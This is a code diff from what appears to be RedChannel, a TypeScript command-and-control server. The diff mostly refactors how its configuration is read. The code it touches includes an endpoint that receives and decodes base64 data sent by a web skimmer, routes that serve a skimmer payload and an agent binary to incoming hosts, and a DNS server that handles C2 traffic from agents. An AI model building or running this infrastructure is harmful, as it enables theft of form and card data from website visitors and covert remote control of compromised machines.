@@ -18,7 +18,7 @@ cli.version(Constants.VERSION, "-v, --version")
     .option("-P, --port [port]", "listen for dns on a specific port", "")
     .option("-W, --web-ip [ip]", "bind web server to ip", "")
     .option("-Y, --web-port [port]", "listen for web on a specific port", "")
-    .option("-I, --agent-interval [ms]", "check in interval for the agent", "")
+    .option("-I, --agent-interval [ms]", "checkin interval for the agent", "")
     .option("-R, --agent-resolver [ip:port]", "set the resolver to use for the agent", "")
     .option("-d, --debug", "enable debug", false)
     .parse(process.argv);
@@ -49,7 +49,7 @@ const cliDebug = cli.getOptionValue("debug") ?? false;
 
 let redchannel: RedChannel;
 try {
-    redchannel = new RedChannel(cliDebug, cliDomain, cliConfig, cliPassword, cliConfigFilePath);
+    redchannel = new RedChannel(cliDebug, cliDomain, cliPassword, cliConfig, cliConfigFilePath);
 } catch (ex) {
     new Logger().error(`Error instantiating RedChannel: ${emsg(ex)}`);
     console.log(ex);
@@ -60,26 +60,22 @@ const ui = new UserInterface(redchannel);
 redchannel.log = ui;
 
 ui.msg(chalk.redBright(Banner));
-/**
- Web channel
- */
-const webServer = require("express")();
 
-webServer.listen(redchannel.config.c2.web_port, redchannel.config.c2.web_ip, (err) => {
+const webServer = require("express")();
+webServer.listen(redchannel.modules.c2.config.web_port, redchannel.modules.c2.config.web_ip, (err) => {
     if (err) return ui.error(`failed to start web server: ${err}`);
-    ui.info(`c2-web listening on: ${redchannel.config.c2.web_ip}:${redchannel.config.c2.web_port}`);
+    ui.info(`c2-web listening on: ${redchannel.modules.c2.config.web_ip}:${redchannel.modules.c2.config.web_port}`);
 });
 
 /**
  Skimmer routes
  */
-
 // incoming skimmer data
 webServer.get(redchannel.modules.skimmer.config.data_route, (request, response) => {
     ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);
 
     const decodedData = Buffer.from(request.query.id, "base64").toString();
-    ui.success(`incoming skimmer data: \n ${decodedData}`);
+    ui.success(`incoming skimmer data:\n${decodedData}`);
     response.send("OK");
 });
 
@@ -91,7 +87,7 @@ webServer.get(redchannel.modules.skimmer.config.payload_route, (request, respons
 });
 
 // agent binary payload
-webServer.get(redchannel.config.c2.binary_route, (request, response) => {
+webServer.get(redchannel.modules.c2.config.binary_route, (request, response) => {
     let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
     ui.warn(`incoming request for agent binary from ${ip}`);
     try {
@@ -111,18 +107,18 @@ const dnsServer = dnsd.createServer(redchannel.c2MessageHandler);
 // prettier-ignore
 dnsServer
     .zone(
-        redchannel.config.c2.domain,
-        "ns1." + redchannel.config.c2.domain,
-        "root@" + redchannel.config.c2.domain,
+        redchannel.modules.c2.config.domain,
+        "ns1." + redchannel.modules.c2.config.domain,
+        "root@" + redchannel.modules.c2.config.domain,
         "now",
         "2h",
         "30m",
         "2w",
         "10m"
     )
-    .listen(redchannel.config.c2.dns_port, redchannel.config.c2.dns_ip);
+    .listen(redchannel.modules.c2.config.dns_port, redchannel.modules.c2.config.dns_ip);
 
-ui.info(`c2-dns listening on: ${redchannel.config.c2.dns_ip}:${redchannel.config.c2.dns_port}`);
+ui.info(`c2-dns listening on: ${redchannel.modules.c2.config.dns_ip}:${redchannel.modules.c2.config.dns_port}`);
 
 if (redchannel.modules.proxy.config.enabled) {
     ui.info(`c2-proxy enabled, checkin at interval: ${redchannel.modules.proxy.config.interval}ms`);
